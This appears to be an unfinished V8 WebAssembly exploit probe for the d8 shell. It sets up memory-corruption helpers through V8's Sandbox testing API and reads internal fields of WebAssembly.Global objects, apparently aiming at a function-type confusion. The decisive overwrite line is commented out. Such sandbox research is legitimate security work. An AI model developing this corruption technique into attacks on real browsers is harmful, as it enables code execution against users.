
d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");


// module 0
let builder0 = new WasmModuleBuilder();
let $sig_l_ll = builder0.addType(makeSig([kWasmI64, kWasmI64], [kWasmI64]));
let $struct0 = builder0.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls_0 = builder0.addType(makeSig([kWasmI64, wasmRefType($struct0)], []));

builder0.addFunction("add", $sig_l_ll)
  .exportFunc()
  .addBody([
      kExprLocalGet, 1,
    kExprLocalGet, 0,
    kExprI64Add,
    kExprReturn,
  ]);

builder0.addFunction("nop", kSig_v_v)
  .exportFunc()
  .addBody([
  ]);

builder0.addFunction("writer", $sig_v_ls_0)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, $struct0, 0,
  ]);

let instance0 = builder0.instantiate();
let { add, nop, writer } = instance0.exports;

// module 1
let builder = new WasmModuleBuilder();
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
let $sig_l_ll_1 = builder.addType(makeSig([kWasmI64, kWasmI64], [kWasmI64]));

let add_fn = builder.addImportedGlobal("import", "add_fn", kWasmAnyFunc, true);

// builder.addFunction("main", $sig_l_ll_1)
//   .exportFunc()
//   .addBody([
//     kExprLocalGet, 1,
//     kExprLocalGet, 0,
//     kExprGlobalGet, add_fn, // 
//     kExprCallFunction, $sig_l_ll_1,
//     // kExprUnreachable,
//   ]);

  builder.addFunction('main', kSig_a_v)
    .addBody([kExprGlobalGet, add_fn])
    .exportAs('main');

// builder.addFunction("writer", $sig_v_ls)
//   .exportFunc()
//   .addBody([
//     kExprLocalGet, 1,
//     kExprLocalGet, 0,
//     kGCPrefix, kExprStructSet, $struct, 0,
//   ]);

let to_imported_add = new WebAssembly.Global({value: 'anyfunc', mutable: true}, add); // 0
let to_imported_nop = new WebAssembly.Global({value: 'anyfunc', mutable: true}, nop); //  1
let to_imported_writer = new WebAssembly.Global({value: 'anyfunc', mutable: true}, writer); // 2




%DebugPrint(to_imported_add);
// %DebugPrint(to_imported_writer);
// %SystemBreak();

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmGlobalObjectRawTypeOffset = 0x1c;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}


// 
let to_imported_add_ptr = getPtr(to_imported_add);
let to_imported_writer_ptr = getPtr(to_imported_writer);

let add_tagged_buffer = getField(to_imported_add_ptr, 0x14);
let writer_tagged_buffer = getField(to_imported_writer_ptr, 0x14);

// setField(to_imported_add_ptr, 0x14, writer_tagged_buffer);


// console.log(to_imported_add.value(1n,2n));


let instance1 = builder.instantiate({import: { add_fn: to_imported_add }});
let { main} = instance1.exports;

console.log(main());